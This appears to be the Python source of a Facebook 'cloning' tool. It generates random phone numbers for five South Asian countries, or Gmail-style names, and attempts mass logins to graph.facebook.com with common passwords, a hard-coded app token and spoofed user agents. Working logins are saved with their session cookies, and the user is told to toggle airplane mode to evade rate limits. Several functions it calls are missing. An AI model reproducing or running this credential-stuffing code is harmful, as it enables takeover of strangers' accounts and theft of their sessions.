#──────────────{ IMPORT }──────────────#
import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,re
from bs4 import BeautifulSoup
from os import path
import os,base64,zlib,pip,urllib
import requests,bs4,mechanize
from os import system as clr
from bs4 import BeautifulSoup as sop
from pip._vendor import requests as requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#──────────────{ LOOP }──────────────#
loop = 0;oks = [];cps = [];id = [];methodx = []
#──────────────{ COLOUR }──────────────#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m'
#───────────────[ COLOR SYSTEM ]─────────────────────────#
orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
my_color = [white,blue,green];warna = random.choice(my_color)
sys.stdout.write('\x1b]2; bishesheyy\x07')
#──────────────{ LINEX }──────────────#
def clear():os.system('clear');print(logo)
def linex():print(f'\n\033[1;37m----------------------------------------------------------------')
fileu = random.randint(20000, 40000)
#──────────────{ LOGO }──────────────#
logo=(f"""{white}
___________      ____ 
\_   _____/__  _/_   |    WRITEEN BY {red}•->{white} BISHESH XETTRI
 |    __) \  \/ /|   |    TOOL {red}•->{white} FILExRANDOMxGMAIL
 |     \   \   / |   |  VERSION {red}•->{white} 2.0
 \___  /    \_/  |___|
     \/               
\033[1;37m----------------------------------------------------------------      
""")

#──────────────{ MENU }──────────────#
def menu():
    clear()
    print(f"{red}•->{white} FILE CLONING")
    print(f"{red}[{white}2{red}]{white} RANDOM CLONING")    
    print(f"{red}[{white}4{red}]{white} EXIT TOOLS")
    linex()
    option = input(f'{red}|{white}?{red}|{green} CHOICE {white}:{green} ')
    if option in ['A','1']:__Filex__()
    elif option in ['B','2']:__Randmx__()
    elif option in ['C','3']:__Gmailx__()
    elif option in ['D','4']:exit()
    else:
        print(f'\n{red}|{white}!{red}|{orange} OPTION FOUND');menu()
#──────────────{ FILE }──────────────#
def __Filex__():
    clear()
    print(f"{red}•->{white} EXAMPLE {white}: {green}/sdcard/name.txt ");linex()
    dfile = input(f'{red}|{white}?{red}|{green} CHOICE  {white}:{green} ')
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{red}|{white}!{red}|{orange} FILE NOT FOUND...');time.sleep(1);__Filex__()
    clear()
    print(f"{red}•->{white} METHOD M1 ")
    print(f"{red}[{white}2{red}]{white} METHOD M2 ")
    print(f"{red}[{white}2{red}]{white} METHOD M3 ")
    print(f"{red}[{white}4{red}]{white} METHOD M4 ")
    print(f"{red}[{white}5{red}]{white} METHOD M5 ")
    linex()
    methodx = input(f'{red}|{white}?{red}|{green} CHOICE {white}:{green} ')
    dplist = []
    try:
        clear()
        pass_lmit = int(input(f'{red}|{white}?{red}|{green} PASSWORD LIMIT {white}:{green} '))
    except:
        pass_lmit =1
    clear()
    print(f"{red}•->{white} EXAMPLE {white}: {green}firstlast {white}|{green}first123{white}| {green}ETC{white}| ");linex()
    for i in range(pass_lmit):
        dplist.append(input(f'{red}•->{white} PASS -{i+1} {white}:{green} '))
    with ThreadPool(max_workers=30) as FIREx:    
        clear();total_ids = str(len(dx))
        print(f"{red}•->{white} METHOD {white}:{green} graphql ")
        print(f"{red}•->{white} FILE UID :{G} {fileu} ")
        print(f"{red}•->{white} USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            if methodx in ['1']:FIREx.submit(__file_M1__,ids,names,passlist)
            if methodx in ['2']:FIREx.submit(__file_M2__,ids,names,passlist)
            if methodx in ['3']:FIREx.submit(__file_M3__,ids,names,passlist)
            if methodx in ['4']:FIREx.submit(__file_M4__,ids,names,passlist)
            if methodx in ['5']:FIREx.submit(__file_M5__,ids,names,passlist)
    print('');linex()
    print(f"{red}•->{white} CLONING COMPLETE ")
    print(f"{red}•->{white} TOTAL OK ID {white}:{green} {len(oks)}")
    print(f"{red}•->{white} TOTAL CP ID {white}:{red} {len(cps)}")
    linex();exit()    
#──────────────{ FILE-METHOD-M1 }──────────────#
#──────────────{ FILE-METHOD-M1 GRAPHQL }──────────────#
#──────────────{ RANDOM }──────────────#
def __Randmx__():
    clear()
    print(f"{red}1{white} BANGLADESH CLONING")
    print(f"{red}[{white}2{red}]{white} INDIA CLONING")
    print(f"{red}[{white}2{red}]{white} NEPAL CLONING")
    print(f"{red}[{white}4{red}]{white} PAKISTAN CLONING")
    print(f"{red}[{white}5{red}]{white} AFGHANISTAN CLONING");linex()
    option = input(f'{red}|{white}?{red}|{green} CHOICE {white}:{green} ')
    if option in ['A','1']:__bdx__()
    elif option in ['B','2']:__india__()
    elif option in ['C','3']:__nepalx__()
    elif option in ['D','4']:__pakistan__()
    elif option in ['E','5']:__afghanistanx__()
    else:
        print(f'\n{red}|{white}!{red}|{orange} OPTION FOUND');menu()
#──────────────{ RANDOM-BD }──────────────#
def __bdx__():
    user=[]
    clear()
    print(f'{red}•->{white} EXAMPLE {white}: {green}017 {white}/ {green}019 {white}/ {green}016 {white}/ {green}018');linex()
    code=input(f'{red}|{white}?{red}|{green} CHOICE  {white}:{green} ')
    clear()
    print(f'{red}•->{white} EXAMPLE {white}: {green}5000 {white}/ {green}10000 {white}/ {green}9999 ');linex()
    try:
        limit=int(input(f'{red}|{white}?{red}|{green} CHOICE  {white}:{green} '))
    except ValueError:
        limit=50000
    clear()
    print(f"{red}•->{white} METHOD M1 ")
    print(f"{red}[{white}2{red}]{white} METHOD M2 ");linex()
    methodx = input(f'{red}|{white}?{red}|{green} CHOICE {white}:{green} ')
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=38) as FIREx:
        clear()
        tl=str(len(user))
        print(f"{red}•->{white} METHOD    {white}:{green} M{methodx} ")
        print(f'{red}•->{white} SIM CODE  {white}:{green} {code} ')
        print(f'{red}•->{white} TOTAL UID {white}:{green} {tl} ')
        print(f"{red}•->{white} USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','freefire','Bangladesh','@@@###','aabbcc','aaabbb']
            if methodx in ['1']:FIREx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:FIREx.submit(__Randm_M2__,ids,passlist)
    print('');linex()
    print(f"{red}•->{white} CLONING COMPLETE ")
    print(f"{red}•->{white} TOTAL OK ID {white}:{G} {len(oks)}")
    print(f"{red}•->{white} TOTAL CP ID {white}:{R} {len(cps)}")
    linex();exit()
#──────────────{ RANDOM-INDIA }──────────────#
def __india__():
    user=[]
    clear()
    print(f'{red}•->{white} EXAMPLE {white}: {green}+91639 {white}/ {green}+98282 {white}/ {green}+92627 ');linex()
    code=input(f'{red}|{white}?{red}|{green} CHOICE  {white}:{green} ')
    clear()
    print(f'{red}•->{white} EXAMPLE {white}: {green}5000 {white}/ {green}10000 {white}/ {green}9999 ');linex()
    try:
        limit=int(input(f'{red}|{white}?{red}|{green} CHOICE  {white}:{green} '))
    except ValueError:
        limit=50000
    clear()
    print(f"{red}•->{white} METHOD M1 ")
    print(f"{red}[{white}2{red}]{white} METHOD M2 ");linex()
    methodx = input(f'{red}|{white}?{red}|{green} CHOICE {white}:{green} ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as FIREx:
        clear()
        tl=str(len(user))
        print(f"{red}•->{white} METHOD    {white}:{green} M{methodx} ")
        print(f'{red}•->{white} SIM CODE  {white}:{green} {code} ')
        print(f'{red}•->{white} TOTAL UID {white}:{green} {tl} ')
        print(f"{red}•->{white} USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,ids[:7],ids[:6],love[1:],"57273200","5757575"]
            if methodx in ['1']:FIREx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:FIREx.submit(__Randm_M2__,ids,passlist)
    print('');linex()
    print(f"{red}•->{white} CLONING COMPLETE ")
    print(f"{red}•->{white} TOTAL OK ID {white}:{G} {len(oks)}")
    print(f"{red}•->{white} TOTAL CP ID {white}:{R} {len(cps)}")
    linex();exit()
#──────────────{ RANDOM-NEPAL }──────────────#
def __nepalx__():
    user=[]
    clear()
    print(f'{red}•->{white} EXAMPLE {white}: {green}9815 {white}/ {green}9840 {white}/ {green}9814 ');linex()
    code=input(f'{red}|{white}?{red}|{green} CHOICE  {white}:{green} ')
    clear()
    print(f'{red}•->{white} EXAMPLE {white}: {green}5000 {white}/ {green}10000 {white}/ {green}9999 ');linex()
    try:
        limit=int(input(f'{red}|{white}?{red}|{green} CHOICE  {white}:{green} '))
    except ValueError:
        limit=50000
    clear()
    print(f"{red}•->{white} METHOD M1 ")
    print(f"{red}[{white}2{red}]{white} METHOD M2 ");linex()    
    methodx = input(f'{red}|{white}?{red}|{green} CHOICE {white}:{green} ')
    for nmbr in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=45) as FIREx:
        clear()
        tl=str(len(user))        
        print(f"{red}•->{white} METHOD    {white}:{green} M{methodx} ")
        print(f'{red}•->{white} SIM CODE  {white}:{green} {code} ')
        print(f'{red}•->{white} TOTAL UID {white}:{green} {tl} ')
        print(f"{red}•->{white} USE WIFI+1.1.1.1 VPN");linex()
        
        for love in user:
            ids=code+love
            passlist=[ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','kathmandu','pokhara','tamang','maya1234','tamang123','kathmandu123']
            if methodx in ['1']:FIREx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:FIREx.submit(__Randm_M2__,ids,passlist)
    print('');linex()
    print(f"{red}•->{white} CLONING COMPLETE ")
    print(f"{red}•->{white} TOTAL OK ID {white}:{G} {len(oks)}")
    print(f"{red}•->{white} TOTAL CP ID {white}:{R} {len(cps)}")
    linex();exit()
#──────────────{ RANDOM-PAKISTAN }──────────────#
def __pakistan__():
    user=[]
    clear()
    print(f'{red}•->{white} EXAMPLE {white}: {green}0306 {white}/ {green}0315 {white}/ {green}0345 ');linex()
    code=input(f'{red}|{white}?{red}|{green} CHOICE  {white}:{green} ')
    clear()
    print(f'{red}•->{white} EXAMPLE {white}: {green}5000 {white}/ {green}10000 {white}/ {green}9999 ');linex()
    try:
        limit=int(input(f'{red}|{white}?{red}|{green} CHOICE  {white}:{green} '))
    except ValueError:
        limit=50000
    clear()
    print(f"{red}•->{white} METHOD M1 ")
    print(f"{red}[{white}2{red}]{white} METHOD M2 ");linex()
    methodx = input(f'{red}|{white}?{red}|{green} CHOICE {white}:{green} ')
    for nmbr in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as FIREx:
        clear()
        tl=str(len(user))
        print(f"{red}•->{white} METHOD    {white}:{green} M{methodx} ")
        print(f'{red}•->{white} SIM CODE  {white}:{green} {code} ')
        print(f'{red}•->{white} TOTAL UID {white}:{green} {tl} ')
        print(f"{red}•->{white} USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
            if methodx in ['1']:FIREx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:FIREx.submit(__Randm_M2__,ids,passlist)
    print('');linex()
    print(f"{red}•->{white} CLONING COMPLETE ")
    print(f"{red}•->{white} TOTAL OK ID {white}:{G} {len(oks)}")
    print(f"{red}•->{white} TOTAL CP ID {white}:{R} {len(cps)}")
    linex();exit()
#──────────────{ RANDOM-AFGHANISTAN }──────────────#
def __afghanistanx__():
    user=[]
    clear()
    print(f'{red}•->{white} EXAMPLE {white}: {green}+9340 {white}/ {green}+9350 {white}/ {green}+9330 ');linex()
    code=input(f'{red}|{white}?{red}|{green} CHOICE  {white}:{green} ')
    clear()
    print(f'{red}•->{white} EXAMPLE {white}: {green}5000 {white}/ {green}10000 {white}/ {green}9999 ');linex()
    try:
        limit=int(input(f'{red}|{white}?{red}|{green} CHOICE  {white}:{green} '))
    except ValueError:
        limit=50000
    clear()
    print(f"{red}•->{white} METHOD M1 ")
    print(f"{red}[{white}2{red}]{white} METHOD M2 ");linex()
    methodx = input(f'{red}|{white}?{red}|{green} CHOICE {white}:{green} ')
    for nmbr in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as FIREx:
        clear()
        tl=str(len(user))
        print(f"{red}•->{white} METHOD    {white}:{green} M{methodx} ")
        print(f'{red}•->{white} SIM CODE  {white}:{green} {code} ')
        print(f'{red}•->{white} TOTAL UID {white}:{green} {tl} ')
        print(f"{red}•->{white} USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
            if methodx in ['1']:FIREx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:FIREx.submit(__Randm_M2__,ids,passlist)
    print('');linex()
    print(f"{red}•->{white} CLONING COMPLETE ")
    print(f"{red}•->{white} TOTAL OK ID {white}:{G} {len(oks)}")
    print(f"{red}•->{white} TOTAL CP ID {white}:{R} {len(cps)}")
    linex();exit()
#──────────────{ GMAIL }──────────────#
def __Gmailx__():
    clear()
    user=[]
    print(f"{red}•->{white} EXAMPLE {white}: {green}Miraz{white}/{green}Shakib{white}/{green}Rahman{white}/{green}Sumon ");linex();first = input(f'{red}|{white}?{red}|{green} FIRST NAME  {white}:{green}  ')
    clear()
    print(f"{red}•->{white} EXAMPLE {white}: {green}Hossain{white}/{green}Khan{white}/{green}Ali{white}/{green}Islam ");linex();last = input(f'{red}|{white}?{red}|{green} LAST NAME  {white}:{green} ')
    period = '.'
    try:
        clear();print(f'{red}•->{white} EXAMPLE {white}: {green}5000 {white}/ {green}10000 {white}/ {green}9999 ');linex()
        limit=int(input(f'{red}|{white}?{red}|{green} CHOICE  {white}:{green} '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as FIRExxxx:
        total=str(len(user))
        clear()
        print(f'{red}•->{white} GMAIL LMT {white}:{green} {total} ')
        print(f'{red}•->{white} TAR GMAIL {white}:{green} {first+last}@gmail.com ')
        print(f"{red}•->{white} USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for digitx in user:
            username=first+period+last+digitx
            pswrd = [first,last,first+last,first+'123',first+'1234',first+'12345',last+'123',last+'1234',last+'12345']
            FIRExxxx.submit(__GMAILX__,username,pswrd,total)
    print('');linex()
    print(f"{red}•->{white} CLONING COMPLETE ")
    print(f"{red}•->{white} TOTAL OK ID {white}:{G} {len(oks)}")
    print(f"{red}•->{white} TOTAL CP ID {white}:{R} {len(cps)}")
    linex();exit()
def generate_real_ua():
    devices = [
        "Samsung SM-G970U", "Samsung SM-G973F", "Xiaomi Redmi Note 11",
        "Xiaomi Poco X3", "Vivo Y20", "Oppo F19", "Google Pixel 7"
    ]
    android_versions = ["12", "11", "10", "13"]
    fbav_versions = [f"{x}.0.0.{random.randint(1000,9999)}" for x in range(300, 500)]
    fbbv_versions = [str(random.randint(1000000, 9999999))]
    densities = ["2.0", "3.0", "3.5", "4.0"]
    widths = ["1080", "1440", "720"]
    heights = ["1920", "2340", "3120"]

    device = random.choice(devices)
    android = random.choice(android_versions)
    fbav = random.choice(fbav_versions)
    fbbv = random.choice(fbbv_versions)
    density = random.choice(densities)
    width = random.choice(widths)
    height = random.choice(heights)

    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {android}; {device} Build/{device.replace(' ','')}); "
        f"FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/density={density};width={width};height={height};"
        f"FBLC/en_US;FBRV/{random.randint(100000000,999999999)};FBCR/;FBMF/{device.split()[0]};"
        f"FBBD/{device.split()[0]};FBPN/com.facebook.katana;FBDV/{device};FBSV/{android};"
        f"FBOP/1;FBCA/arm64-v8a;"
    )
    return ua        
#──────────────{ RANDOM-METHOD-M1 }──────────────#
def __Randm_M1__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{red}|{green} RUNNING-M1{red}|{green} {loop} {white}| {green}{len(oks)} {white}| {red}{len(cps)}');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': generate_real_ua(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                print(f'\r\r\x1b[38;5;46m|bishesheyy| {str(uid)} | {pas} ')
                                #print(f'\r\r\x1b[38;5;46m|NUM|-> {cid} ')
                                #print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
                                open('/sdcard/bishesheyy/RAND/M1-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r{R}|bishesheyy-CP| {str(uid)} | {pas} ')
                                open('/sdcard/bishesheyy/RAND/CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#──────────────{ RANDOM-METHOD-M2 }──────────────#

# 
#──────────────{ GMAIL-METHOD }──────────────#

#──────────────{ END }──────────────#
if __name__ == "__main__":
    try:os.mkdir('bishesheyy')
    except:pass
    menu()